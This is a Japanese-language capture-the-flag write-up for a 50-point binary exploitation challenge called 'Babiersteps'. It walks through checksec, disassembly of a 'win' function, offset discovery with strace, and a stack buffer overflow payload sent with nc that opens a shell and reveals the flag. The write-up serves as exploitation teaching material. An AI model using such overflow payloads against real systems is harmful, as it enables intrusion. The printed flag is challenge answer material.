# Babiersteps:Binary Exploitation:50pts
Baby steps! One has to crawl before they can run.  

**Connect with:**  
```
nc challenge.nahamcon.com 30523
```

**Attachments:** [babiersteps](babiersteps)  

# Solution
ncの接続先とバイナリが渡される。  
実行すると以下のようであった。  
```bash
$ ./babiersteps
Everyone has heard of gets, but have you heard of scanf?
123456789
```
セキュリティ機構は以下の通りであった。  
```bash
$ checksec ./babiersteps
[*] '/babiersteps'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
BOFを行えばよいのだろうか。  
objdumpで見るとwinなる関数があった。  
```bash
$ objdump -D ./babiersteps

./babiersteps:     file format elf64-x86-64
~~~
00000000004011c9 <win>:
  4011c9:       f3 0f 1e fa             endbr64
  4011cd:       55                      push   %rbp
  4011ce:       48 89 e5                mov    %rsp,%rbp
  4011d1:       ba 00 00 00 00          mov    $0x0,%edx
  4011d6:       be 00 00 00 00          mov    $0x0,%esi
  4011db:       48 8d 3d 26 0e 00 00    lea    0xe26(%rip),%rdi        # 402008 <_IO_stdin_used+0x8>
  4011e2:       e8 a9 fe ff ff          callq  401090 <execve@plt>
  4011e7:       90                      nop
  4011e8:       5d                      pop    %rbp
  4011e9:       c3                      retq
~~~
```
内部ではexecを呼んでいるようだ。  
BOFでここへリターンすることを狙う。  
オフセットを調査する。  
```bash
$ python -c 'print("A"*120+"BCD")' | strace -i ./babiersteps
~~~
[00007f7df8cbb002] read(0, "A", 1)      = 1
[00007f7df8cbb002] read(0, "A", 1)      = 1
[00007f7df8cbb002] read(0, "B", 1)      = 1
[00007f7df8cbb002] read(0, "C", 1)      = 1
[00007f7df8cbb002] read(0, "D", 1)      = 1
[00007f7df8cbb002] read(0, "\n", 1)     = 1
[00007f7d00444342] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f7d00444342} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```
120のようだ。  
以下のようにBOFでwinへ飛ばしてやればよい。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc9\x11\x40\x00\x00\x00\x00\x00";cat) | nc challenge.nahamcon.com 30523
Everyone has heard of gets, but have you heard of scanf?
ls
babiersteps
bin
dev
etc
flag.txt
lib
lib32
lib64
libx32
usr
cat flag.txt
flag{4dc0a785da36bfcf0e597917b9144fd6}
```
シェルが得られ、ファイルを読み取るとflagが書かれていた。  

## flag{4dc0a785da36bfcf0e597917b9144fd6}